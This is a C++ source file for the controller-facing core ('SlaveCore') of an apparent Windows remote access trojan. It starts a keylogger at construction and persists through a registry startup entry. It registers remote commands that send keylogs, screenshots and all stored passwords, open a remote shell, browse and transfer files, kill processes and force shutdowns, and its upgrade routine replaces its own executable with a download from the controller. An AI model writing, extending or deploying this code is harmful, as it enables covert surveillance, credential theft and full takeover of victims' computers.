#include <log/Log.hpp>

#include <system/System.hpp>
#include <system/Registry.hpp>
#include <system/Process.hpp>
using namespace System;

#include <common/Innocence.hpp>

#include <blaspheme/transfer/FileTransfer.hpp>
using namespace Blaspheme;

#include <keyboard/Keylogger.hpp>
#include <keyboard/KeyLogObserver.hpp>
using namespace Keyboard;

#include <malicious/Screenshot.hpp>

#include "RemoteControlFunctions.hpp"
#include "SlaveCore.hpp"

namespace Inhibition {
	SlaveCore::SlaveCore(Common::ConnectionInfo info) :
		exited(false),
		session(info, Network::Timeout(60)),
		installPath(System::getWindowsPath() + "\\" + Common::INHIBITER_EXE_NAME),
		keylogPath(System::getWindowsPath() + "\\" + Common::KEYLOG),
		dllPath(System::getWindowsPath() + "\\" + Common::INHIBITION_DLL_NAME),
		startup(installPath) {
		setConnection(info);

		// recuperation du chemin d'installation de l'injecteur
		KeyLogObserver * keyLogObserver = new KeyLogObserver(keylogPath);
		Keylogger::instance().addObserver(keyLogObserver);
		Keylogger::instance().start();

		// tous les modules utilisent le meme canal de commande
		SlaveAbstractFunction::setSlave(*this);

		// initialisation des modules
		// on active les modules que le client peut utiliser
		dispatcher.addServerFunction(KILL_CLIENT,           new KillClient);
		dispatcher.addServerFunction(UNINSTALL_CLIENT,      new UninstallClient);
		dispatcher.addServerFunction(GET_LOGFILE,           new SendKeylog(keyLogObserver));
		dispatcher.addServerFunction(GET_SCREEN,            new SendScreenshot(screenshot));
		dispatcher.addServerFunction(PASSWORDS_GETALL,      new SendPasswords);
		dispatcher.addServerFunction(GET_PROCESSLIST,       new SendProcessList);
		dispatcher.addServerFunction(KILL_PROCESS,          new KillProcess);
		dispatcher.addServerFunction(UPGRADE_CLIENT,        new UpgradeClient);
		dispatcher.addServerFunction(SHUTDOWN,              new Shutdown);
		dispatcher.addServerFunction(REBOOT,                new Reboot);
		dispatcher.addServerFunction(LOGOUT,                new Logout);
		dispatcher.addServerFunction(GET_WINDOWS_VERSION,   new SendWindowsVersion);
		dispatcher.addServerFunction(REBOOT_CLIENT,         new RebootClient);
		dispatcher.addServerFunction(BROWSE_FILES,          new BrowseFileTree);
		dispatcher.addServerFunction(REMOTE_SHELL,          new RemoteShell);
		dispatcher.addServerFunction(START_DOWNLOAD,        new StartDownload);
		dispatcher.addServerFunction(START_UPLOAD,          new StartUpload);
		dispatcher.addServerFunction(GET_CLIENT_NAME,       new SendClientName);
	}

	SlaveCore::~SlaveCore() {
		exit();
	}

	Blaspheme::Session& SlaveCore::getSession() {
		return session;
	}

	void SlaveCore::exit() {
		LOG << "Slave exiting normally";
		exited = true;
	}

	bool SlaveCore::exiting() {
		return exited;
	}

	bool SlaveCore::connect() {
		return session.connect();
	}

	bool SlaveCore::acquire_stream() {
		/*
		TcpClient aux;
		if(aux.connect(cinfo.ip, cinfo.port))
		{
			if(auth.authentificate(aux))
			{
				aux.send(Common::toString(session.get_id())+'\n');
				session.push_stream(aux);
				return true;
			}
			else
			{
				aux.reset();
			}
		}
		*/
		return false;
	}

	const Common::ConnectionInfo& SlaveCore::getConnection()const {
		return session.getConnection();
	}

	void SlaveCore::setConnection(const Common::ConnectionInfo& info) {
		session.setConnection(info);
	}

	const std::string& SlaveCore::getInstallPath() {
		return installPath;
	}

	void SlaveCore::disconnect() {
		LOG << "Disconnecting";
		// on nettoie a la fois la connexion principale et les connexions auxiliaire
		session.setId(0);
		session.reset();
	}

	bool SlaveCore::process_command() {
		TRACE_FUNCTION
		std::string buffer_cmd;
		LOG << "Waiting command";
		session >> buffer_cmd;
		if(dispatcher.find(buffer_cmd)) {
			LOG << "Command known : " + buffer_cmd;
			dispatcher.dispatch(buffer_cmd);
		} else {
			LOG << "Command unknown : " + buffer_cmd;
			return false;
		}
		return true;
	}

	bool SlaveCore::uninstall() {
		LOG << "Removing registry key";
		startup.uninstall();
		LOG << "Launching uninstaller";
		System::Process::Launcher uninstaller(getInstallPath(), Common::UNINSTALL_CMD);
		exit();
		return true;
	}

	void SlaveCore::upgrade() {
		LOG << "Upgrading executable";
		if(!DeleteFile(getInstallPath().c_str())) {
			LOG << "DeleteFile failed : "+Common::toString(GetLastError());
			session << FAILURE;
			return;
		}
		session << SUCCESS;
		Download download(getInstallPath(), session.stream());
		download.launch();
	}

}
